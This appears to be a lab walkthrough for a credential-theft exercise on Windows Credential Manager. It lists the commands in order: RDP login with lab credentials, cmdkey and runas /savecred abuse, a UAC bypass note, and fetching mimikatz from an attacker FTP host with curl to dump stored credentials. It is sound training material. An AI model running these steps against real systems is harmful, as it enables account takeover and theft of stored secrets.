# Attacking Windows Credential Manager

## What is the password mcharles uses for OneDrive?

1/
 ```
   xfreerdp3 /u:sadams /p:'totally2brow2harmon@' /v:10.129.9.172
   ```

 ![2026-01-28-22-47-56](assets/2026-01-28-22-47-56.png)

2/
   ```
   cmdkey /list
   ```
![2026-01-28-23-03-45](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-28%20%D0%B2%2023.03.45.png)

3/
   ```
    runas /savecred /user:SRV01\\mcharles cmd
    runas /user:SRV01\mcharles /savecred cmd
   ```
   
![Снимок экрана 2026-01-28 в 23.11.41](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-28%20%D0%B2%2023.11.41.png)

4/ 
   ```
    msconfig UAC bypass
   ```
   ![Снимок экрана 2026-01-28 в 23.28.13](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-28%20%D0%B2%2023.28.13.png)

![Снимок экрана 2026-01-28 в 23.31.31](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-28%20%D0%B2%2023.31.31.png)


5/ 
   ```
    >cd C:\\Users\\Administrator
   ```
   
   ```
   cd /usr/share/windows-resources/mimikatz/x64
   sudo python3 -m pyftpdlib --port 21
   ```
   
   ```
   >curl --output mimikatz.exe ftp://10.10.14.14/mimikatz.exe 
   >dir
   >mimikatz.exe
   
   privilege::debug 
   sekurlsa::credman
   vault::cred
   ```
   
   ![Снимок экрана 2026-01-29 в 09.33.14](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-01-29%20%D0%B2%2009.33.14.png)

